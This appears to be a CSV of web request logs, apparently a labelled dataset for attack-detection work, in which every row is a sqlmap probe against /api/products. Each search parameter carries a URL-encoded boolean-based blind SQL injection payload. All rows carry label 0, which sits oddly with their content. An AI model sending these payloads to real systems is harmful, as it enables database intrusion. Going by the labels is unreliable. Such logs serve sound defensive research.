@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-05 02:43:11+00:00,(empty),GET,/api/products?q=a%22%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%282981%3D5749%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%28%22UyHs%22%3D%22UyHs,/api/products,172.20.0.10,efa7db5e4580e02283e9044b528973fc,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%22%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%282309%3D5933%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%22BNOA%22%3D%22BNOA,/api/products,172.20.0.10,ba45d36e32ab1105b10acc07e9a6b785,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%22%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285673%3D5673%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%22yqpu%22%3D%22yqpu,/api/products,172.20.0.10,bafc6ca914dab14f520dea048ea58d4a,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%22%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%283418%3D9398%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%22qrra%22%3D%22qrra,/api/products,172.20.0.10,56cda7b3560c0ff6b62cc343d71ce4af,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%283170%3D9944%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%286015%3D6015,/api/products,172.20.0.10,b5e656528ee9e3f3e8fb0b55882ced47,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285673%3D5673%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%281513%3D1513,/api/products,172.20.0.10,95725b1cb8403d41f39f5bcfe675ce30,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%282080%3D3578%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%287462%3D7462,/api/products,172.20.0.10,c1644b688995465d457a2149862c3262,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%29%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%283063%3D5785%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%28%289079%3D9079,/api/products,172.20.0.10,06f6f03d2a990356f4946330005cc211,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%29%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285673%3D5673%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%28%284375%3D4375,/api/products,172.20.0.10,3ba9501e613581cec7c40b869face883,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%29%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%282477%3D6299%29%20THEN%200x61%20ELSE%200x28%20END%29%29%20AND%20%28%283000%3D3000,/api/products,172.20.0.10,14d7fb9fa49d1ca028196cde91723789,0.0,19.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%287910%3D6836%29%20THEN%200x61%20ELSE%200x28%20END%29%29,/api/products,172.20.0.10,95168b936eddbe8d6594e2315d4c9497,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285673%3D5673%29%20THEN%200x61%20ELSE%200x28%20END%29%29,/api/products,172.20.0.10,daa8aa034ec9f657f466306d2f53ad42,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%287851%3D2363%29%20THEN%200x61%20ELSE%200x28%20END%29%29,/api/products,172.20.0.10,4c4b0d40a9d14320241bd440e4d34873,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%281422%3D1673%29%20THEN%200x61%20ELSE%200x28%20END%29%29--%20PbGl,/api/products,172.20.0.10,502b953defd4911cce9c9f0e07a44910,0.0,6.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%285673%3D5673%29%20THEN%200x61%20ELSE%200x28%20END%29%29--%20TyvB,/api/products,172.20.0.10,75e022bda3a87c17fb6fd896964a7340,0.0,15.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%282164%3D4363%29%20THEN%200x61%20ELSE%200x28%20END%29%29--%20IThk,/api/products,172.20.0.10,5b1399bf1fa91405af401704dceee904,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283481%3D5485%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%28112%29%7C%7CCHR%2887%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%27QOhA%27%3D%27QOhA,/api/products,172.20.0.10,ff2bfdc22fa1cde34982b182eb4e7dce,0.0,5.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%27pXZK%27%3D%27pXZK,/api/products,172.20.0.10,17340768512ac2f299139cda990270eb,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%284551%3D4636%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28104%29%7C%7CCHR%28116%29%7C%7CCHR%28102%29%7C%7CCHR%28122%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%27lynS%27%3D%27lynS,/api/products,172.20.0.10,6d3fa9a372ca5a5bfb1ba3eaccea45f9,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:12+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%287833%3D2349%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2875%29%7C%7CCHR%2871%29%7C%7CCHR%2882%29%7C%7CCHR%2887%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%28%27BjHe%27%3D%27BjHe,/api/products,172.20.0.10,9c6d3614a3ce5a7d4930827d993f9800,0.0,6.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%28%27HBYJ%27%3D%27HBYJ,/api/products,172.20.0.10,81f5bdc754b28eb36d98fef908710f65,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%285533%3D3532%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28115%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%2884%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%28%27PUlV%27%3D%27PUlV,/api/products,172.20.0.10,f6c62ec0ac97fcfc1e7fc1e3bfbfd3d3,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%283120%3D6787%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2897%29%7C%7CCHR%2880%29%7C%7CCHR%2889%29%7C%7CCHR%28114%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27Smbf%27%3D%27Smbf,/api/products,172.20.0.10,0c0f99856624218836588468aa142053,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27YndV%27%3D%27YndV,/api/products,172.20.0.10,6aa8462033aed76498092603ebac9477,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%285108%3D5941%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2866%29%7C%7CCHR%28115%29%7C%7CCHR%28121%29%7C%7CCHR%28100%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27KFeC%27%3D%27KFeC,/api/products,172.20.0.10,19f95a6ad13c201d5ce654c01fe623dd,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%286786%3D4708%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28119%29%7C%7CCHR%2887%29%7C%7CCHR%28105%29%7C%7CCHR%2884%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%27tOFa%27%20LIKE%20%27tOFa,/api/products,172.20.0.10,76b43939bbc8295b1a7067cf8d9e18b6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%27kXtX%27%20LIKE%20%27kXtX,/api/products,172.20.0.10,a8985384b2d469b98472875f6ea09410,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%281270%3D4424%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2882%29%7C%7CCHR%28108%29%7C%7CCHR%2882%29%7C%7CCHR%28103%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%27wwEM%27%20LIKE%20%27wwEM,/api/products,172.20.0.10,a030d9acadd13d7f1087b6a1c431ba78,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%287521%3D8888%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2882%29%7C%7CCHR%28108%29%7C%7CCHR%28119%29%7C%7CCHR%28117%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27lLVj%25%27%3D%27lLVj,/api/products,172.20.0.10,8e04bb756462042d2e384c0aff9f6840,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27dfzM%25%27%3D%27dfzM,/api/products,172.20.0.10,0b1dfd1b6fcef27f81f9e2d011b5e57d,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%25%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%286778%3D3201%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28114%29%7C%7CCHR%28109%29%7C%7CCHR%28119%29%7C%7CCHR%28105%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27WUgs%25%27%3D%27WUgs,/api/products,172.20.0.10,a531748f00ef71dd52ef8e7e83b46cb7,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%289559%3D9595%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2888%29%7C%7CCHR%2889%29%7C%7CCHR%2866%29%7C%7CCHR%28110%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27eoMa%27%20LIKE%20%27eoMa,/api/products,172.20.0.10,113654f99e81ba2486ed3fe371f32ce4,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27EGPu%27%20LIKE%20%27EGPu,/api/products,172.20.0.10,f6793fd4c1bff3035e79dfe88a5327a5,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%284154%3D3005%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2876%29%7C%7CCHR%28109%29%7C%7CCHR%28118%29%7C%7CCHR%2889%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%27OwGt%27%20LIKE%20%27OwGt,/api/products,172.20.0.10,f9c498b4f85f917a6b4624aa62fb0929,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%22%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%285636%3D6630%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2876%29%7C%7CCHR%28105%29%7C%7CCHR%28117%29%7C%7CCHR%28101%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%22FRhL%22%3D%22FRhL,/api/products,172.20.0.10,ca05656f170696f7f3cd11633fa7134f,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%22%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%22jzgE%22%3D%22jzgE,/api/products,172.20.0.10,1819646a0b666e78b1437ffe089f651e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%22%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%285460%3D3734%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2882%29%7C%7CCHR%28109%29%7C%7CCHR%2889%29%7C%7CCHR%2899%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%22PctO%22%3D%22PctO,/api/products,172.20.0.10,a2410e5fde9a2118e97e7772706aaba8,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%22%20AND%20%28SELECT%20%28CASE%20WHEN%20%289651%3D6616%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2898%29%7C%7CCHR%2881%29%7C%7CCHR%2878%29%7C%7CCHR%2880%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%22opJt%22%3D%22opJt,/api/products,172.20.0.10,ada9f136aa8bf2219c7e918e9a5ecf60,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%22%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%22TwpZ%22%3D%22TwpZ,/api/products,172.20.0.10,dc0e38d8e9a89b3c1aeb91a99f5b1b7b,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%22%20AND%20%28SELECT%20%28CASE%20WHEN%20%281608%3D2825%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28108%29%7C%7CCHR%2890%29%7C%7CCHR%2884%29%7C%7CCHR%2899%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%22xraw%22%3D%22xraw,/api/products,172.20.0.10,c30731715a737378ca27dde93d7261f3,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%289136%3D6268%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28102%29%7C%7CCHR%2883%29%7C%7CCHR%2898%29%7C%7CCHR%2865%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%281981%3D1981,/api/products,172.20.0.10,0c6342b68fa41280a28e466c71149a22,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%283758%3D3758,/api/products,172.20.0.10,c393d3ae8255a5da616175c6890af8bf,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%285835%3D8706%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2872%29%7C%7CCHR%28122%29%7C%7CCHR%28115%29%7C%7CCHR%2890%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%283180%3D3180,/api/products,172.20.0.10,d9c516d52285bc77a35cf7ba8a075749,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%289202%3D2916%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2869%29%7C%7CCHR%2890%29%7C%7CCHR%28112%29%7C%7CCHR%28103%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%284015%3D4015,/api/products,172.20.0.10,40f2946eb58ea8008c759fad4bf4bae1,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%287452%3D7452,/api/products,172.20.0.10,d61f7e47c6a33043ba4bc67ccd3eed6e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%29%29%20AND%20%28SELECT%20%28CASE%20WHEN%20%281017%3D4189%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2879%29%7C%7CCHR%2868%29%7C%7CCHR%2873%29%7C%7CCHR%2888%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%28%287388%3D7388,/api/products,172.20.0.10,62c374f57888f130f15bf55159201a66,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%286005%3D5173%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28110%29%7C%7CCHR%28106%29%7C%7CCHR%2877%29%7C%7CCHR%2875%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL,/api/products,172.20.0.10,6ea8c8faec9d213021e6f9da0e778b9e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL,/api/products,172.20.0.10,250e6e8bd9e5c6c733f9e874663a8bf4,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%282574%3D9761%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2899%29%7C%7CCHR%2865%29%7C%7CCHR%2865%29%7C%7CCHR%28108%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL,/api/products,172.20.0.10,b5dd2933d46b4f6d333edb324321da04,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%288994%3D5023%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%2874%29%7C%7CCHR%28108%29%7C%7CCHR%2875%29%7C%7CCHR%28104%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL--%20QLKF,/api/products,172.20.0.10,9eedf39eae6cc4ffb3149746b393a7a4,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:13+00:00,(empty),GET,/api/products?q=a%20AND%20%28SELECT%20%28CASE%20WHEN%20%283910%3D3910%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28122%29%7C%7CCHR%2880%29%7C%7CCHR%28110%29%7C%7CCHR%28121%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL--%20TTQc,/api/products,172.20.0.10,0d2da7a42e910848c7de5c11730420fe,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
